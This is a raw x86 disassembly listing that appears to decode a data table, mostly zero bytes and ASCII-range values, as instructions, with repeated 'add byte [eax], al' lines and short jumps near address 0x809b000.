add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [eax + eax], ch
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [edi], ch
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jo 0x809ae86
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jno 0x809ae9a
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jb 0x809aeae
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jae 0x809aec2
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
je 0x809aed6
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jne 0x809aeea
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jbe 0x809aefe
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
ja 0x809af12
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
js 0x809af26
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jns 0x809af3a
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jp 0x809af4e
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [edx], al
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [eax + eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ebp], al
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [edi], al
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
dec edx
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [edi], cl
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
push edx
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [edi], dl
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
pop edx
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [edi], ah
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
push 0x29000000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [eax + eax], ch
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [edi], ch
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jo 0x809b296
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jno 0x809b2aa
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jb 0x809b2be
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jae 0x809b2d2
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
je 0x809b2e6
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jne 0x809b2fa
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jbe 0x809b30e
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
ja 0x809b322
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
js 0x809b336
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jns 0x809b34a
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
jp 0x809b35e
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor byte [eax], al
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
cmp al, byte [eax]
add byte [eax], al
cmp al, byte [eax]
add byte [eax], al
cmp eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0x3d000000], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0x3d000000], bh
add byte [eax], al
add byte [0], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
xor al, 0
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
xor eax, 0x29000000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
add byte ss:[eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
aaa
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
cmp byte [eax], al
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
cmp dword [eax], eax
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
xor byte [eax], al
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
xor al, 0
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
xor eax, 0x29000000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
add byte ss:[eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
aaa
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
cmp byte [eax], al
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
cmp dword [eax], eax
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor al, 0
add byte [eax], al
xor byte [eax], al
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor al, 0
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor al, 0
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor al, 0
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor al, 0
add byte [eax], al
xor al, 0
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor al, 0
add byte [eax], al
xor eax, 0x29000000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
xor al, 0
add byte [eax], al
add byte ss:[eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
xor al, 0
add byte [eax], al
aaa
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
xor al, 0
add byte [eax], al
cmp byte [eax], al
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor al, 0
add byte [eax], al
cmp dword [eax], eax
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub byte [eax], al
add byte [eax], al
xor eax, 0x30000000
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
push eax
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
popal
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsd dx, dword [esi]
add byte [eax], al
add byte [esi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809b78a
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809b79a
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ch
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dh
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
inc edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
inc edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
inc edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ah
add byte [eax], al
popal
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
imul eax, dword [eax], 0
add byte [ebx], ah
add byte [eax], al
popal
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dh
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ch
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dh
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dh
add byte [eax], al
add byte [bx + si], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [bx + si], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [bx + si], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], cl
add byte [eax], al
jp 0x809b8aa
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], cl
add byte [eax], al
jp 0x809b8be
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec ebp
add byte [eax], al
add byte [eax], cl
add byte [eax], al
jp 0x809b8d2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc edi
add byte [eax], al
add byte [eax], cl
add byte [eax], al
jp 0x809b8e6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], cl
add byte [eax], al
jp 0x809b8fa
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809b906
add byte [eax], al
insb byte es:[edi], dx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
insb byte es:[edi], dx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ah
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
insb byte es:[edi], dx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ah
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ch
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dh
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ah
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
insd dword es:[edi], dx
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
pop esi
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ah
arpl word [eax], ax
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [esi], bl
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [esi], bl
add byte [eax], al
xor al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [ebp], ch
add byte [eax], al
pop esi
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
insd dword es:[edi], dx
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
pop esi
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ah
arpl word [eax], ax
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [esi], bl
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [esi], bl
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [ebp], ch
add byte [eax], al
pop esi
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
das
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
pop esi
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dl
add byte [eax], al
popal
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
push eax
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec ebp
add byte [eax], al
add byte [eax], dl
add byte [eax], al
popal
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
push eax
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809bada
add byte [eax], al
popal
add byte [eax], al
add byte [eax + eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], dh
jb 0x809baee
add byte [eax], al
popal
add byte [eax], al
